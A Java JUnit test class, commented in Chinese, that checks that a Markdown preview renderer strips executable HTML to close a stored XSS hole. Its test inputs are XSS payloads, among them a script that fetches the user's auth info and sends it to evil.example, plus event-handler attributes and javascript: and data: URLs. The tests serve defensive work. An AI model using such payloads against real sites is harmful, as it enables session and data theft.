package com.springairag.core.service;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Batch 813. 预览链路的存储型 XSS。
 *
 * <p>这条链是这样的：{@code GET /files/preview/html} 把文件库里的 Markdown 渲染成 HTML，
 * WebUI 的 {@code FilePreview} 用 {@code dangerouslySetInnerHTML} 把它注入
 * <b>应用自己的源</b>。因此凡是能写进文件库的人，都能在这台应用里执行任意脚本。
 *
 * <p>commonmark-java 的 {@code HtmlRenderer} 默认<b>原样透传</b> Markdown 源码里的裸 HTML，
 * 所以 {@code <script>}、{@code onerror=}、{@code javascript:} URL 在修复前全部直达 DOM。
 *
 * <p>本类只钉"渲染结果的 HTML 形状"，不钉具体净化库：换实现不该让这些用例变红，
 * 而放松任何一条都必须让它变红。
 */
@DisplayName("Markdown 预览渲染不得产出可执行 HTML")
class MarkdownPreviewSanitizationTest {

    private final MarkdownRendererService service = new MarkdownRendererService();

    private String render(String markdown) {
        return service.renderToHtml(markdown, "notes/readme.md");
    }

    // ── 脚本执行面 ──────────────────────────────────────────────────────────

    @Test
    @DisplayName("裸 <script> 标签不得出现在结果里")
    void scriptTagIsRemoved() {
        String html = render("before\n\n<script>fetch('/api/auth/me').then(r=>r.text()).then(t=>fetch('https://evil.example/?'+btoa(t)))</script>\n\nafter");

        assertFalse(html.contains("<script"), () -> "渲染结果仍含可执行脚本：" + html);
        // 文本内容可以留下，被去掉的是标签
        assertTrue(html.contains("before"), "脚本前后的正文必须保留：" + html);
    }

    @Test
    @DisplayName("事件处理属性（onerror/onload/onclick）不得出现在结果里")
    void eventHandlerAttributesAreRemoved() {
        String html = render("<img src=\"x\" onerror=\"alert(1)\">");

        assertFalse(html.toLowerCase().contains("onerror"), () -> "仍含 onerror：" + html);
    }

    @Test
    @DisplayName("javascript: 伪协议链接不得出现在结果里")
    void javascriptUrlIsNeutralised() {
        String html = render("[click me](javascript:alert(1))");

        String lower = html.toLowerCase();
        assertFalse(lower.contains("javascript:"), () -> "仍含 javascript: 伪协议：" + html);
    }

    @Test
    @DisplayName("<img src> 上的 javascript:/data: 伪协议必须被剥掉")
    void imageSourceProtocolsAreRestricted() {
        String js = render("![x](javascript:alert(1))");
        String data = render("![y](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)");

        // 先确认 <img> 本身还在——否则"伪协议没出现"可能只是 Markdown 压根没解析出
        // 这张图，断言就变成了空洞通过。
        assertTrue(js.contains("<img"), () -> "img 元素本身被丢掉了，断言将失去意义：" + js);
        assertTrue(data.contains("<img"), () -> "img 元素本身被丢掉了，断言将失去意义：" + data);

        assertFalse(js.toLowerCase().contains("javascript:"), () -> "img src 仍可带 javascript:：" + js);
        assertFalse(data.toLowerCase().contains("data:"), () -> "img src 仍可带 data:：" + data);
    }

    @Test
    @DisplayName("链接上的 data: URL 必须被剥掉，且链接本身留下")
    void dataUrlInHrefIsNeutralised() {
        String html = render("[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)");

        assertTrue(html.contains("<a"), () -> "a 元素本身被丢掉了：" + html);
        assertTrue(html.contains("click me"), () -> "链接文本应当保留：" + html);
        assertFalse(html.toLowerCase().contains("data:"), () -> "a href 仍可带 data:：" + html);
    }

    @Test
    @DisplayName("<iframe> 不得出现在结果里")
    void iframeIsRemoved() {
        String html = render("<iframe src=\"https://evil.example/\"></iframe>");

        assertFalse(html.toLowerCase().contains("<iframe"), () -> "仍含 iframe：" + html);
    }

    @Test
    @DisplayName("普通元素上的事件处理属性不得出现在结果里，且元素文本要留下")
    void inlineHtmlEventHandlerIsRemovedButTextSurvives() {
        // commonmark 会把 `<svg/onload=…>` 这种非法的标签起始语法转义成文本，
        // 所以真正能穿透的是下面这种合法的 HTML 块。
        String html = render("<div onmouseover=\"alert(1)\">hover me</div>");

        String lower = html.toLowerCase();
        assertFalse(lower.contains("onmouseover"), () -> "仍含 onmouseover：" + html);
        assertTrue(html.contains("hover me"), () -> "元素文本应保留，不应整块丢弃：" + html);
    }

    @Test
    @DisplayName("<style> 块不得出现在结果里")
    void styleBlockIsRemoved() {
        String html = render("<style>body{display:none}</style>");

        assertFalse(html.toLowerCase().contains("<style"), () -> "仍含 style：" + html);
    }

    // ── 净化不得伤到正常渲染 ────────────────────────────────────────────────

    @Test
    @DisplayName("正常的 Markdown 结构必须照常渲染")
    void ordinaryMarkdownStillRenders() {
        String html = render("# Title\n\nSome **bold** and *italic* text with a [link](https://example.com).");

        assertTrue(html.contains("<h1>"), () -> "标题丢失：" + html);
        assertTrue(html.contains("<strong>bold</strong>"), () -> "加粗丢失：" + html);
        assertTrue(html.contains("href=\"https://example.com\""), () -> "链接丢失：" + html);
    }

    @Test
    @DisplayName("相对图片路径必须保留——<base> 标签靠它解析")
    void relativeImagePathSurvivesSanitisation() {
        String html = render("![alt](image.png)");

        assertTrue(html.contains("src=\"image.png\""), () -> "相对图片路径被净化掉了：" + html);
    }

    @Test
    @DisplayName("净化用的哨兵 base 绝不能泄漏到输出里")
    void sanitizerBaseSentinelNeverLeaks() {
        // jsoup 需要一个绝对 base 才肯保留相对链接，而相对链接又绝不能按它解析。
        // 这个哨兵就是那条绊线：一旦将来 jsoup 改成会解析，预览就会指向一个死主机，
        // 而这条用例会先红。
        String html = render("![a](image.png)\n\n![b](./sub/pic.jpg)\n\n[x](other/page.md)\n\n"
                + "![c](https://cdn.example.com/x.png)");

        assertFalse(html.contains("preview-base.invalid"),
                () -> "净化哨兵泄漏到了输出里：" + html);
        assertFalse(html.contains("/sub/pic.jpg\"") && html.contains("preview-base.invalid"),
                "相对路径被改写成了绝对路径");
    }

    @Test
    @DisplayName("代码块里的内容按文本展示，不应被当成可执行标记")
    void codeBlockContentIsEscapedNotExecuted() {
        String html = render("```html\n<script>alert(1)</script>\n```");

        assertFalse(html.contains("<script>alert(1)</script>"), () -> "代码块内容未转义：" + html);
        assertTrue(html.contains("alert(1)"), () -> "代码文本本身应当保留为可见文本：" + html);
    }
}
